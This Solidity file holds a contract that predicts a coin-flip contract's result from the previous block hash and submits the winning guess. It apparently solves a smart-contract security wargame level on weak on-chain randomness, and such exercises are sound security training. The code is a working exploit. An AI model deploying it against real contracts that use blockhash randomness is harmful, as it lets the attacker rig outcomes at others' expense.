// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

import "./interfaces/ICoinFlip.sol";

contract CoinFlipGuesser {
    ICoinFlip immutable COIN_FLIP_CONTRACT;
    uint256 constant COIN_FLIP_CONTRACT_FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 lastBlock = 0;

    event CoinFlipGuesserResult(bool guess_result);

    constructor(address _coin_flip_contact_address) {
        COIN_FLIP_CONTRACT = ICoinFlip(_coin_flip_contact_address);
    }

    function guessCoinFlip() external {
        require(block.number != lastBlock, "Wait until new Block is mined");
        lastBlock = block.number;

        uint256 blockHash = uint256(blockhash(block.number - 1));

        uint coinFlip = blockHash / COIN_FLIP_CONTRACT_FACTOR;

        bool guess = coinFlip == 1 ? true : false;

        bool guess_result = COIN_FLIP_CONTRACT.flip(guess);

        emit CoinFlipGuesserResult(guess_result);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}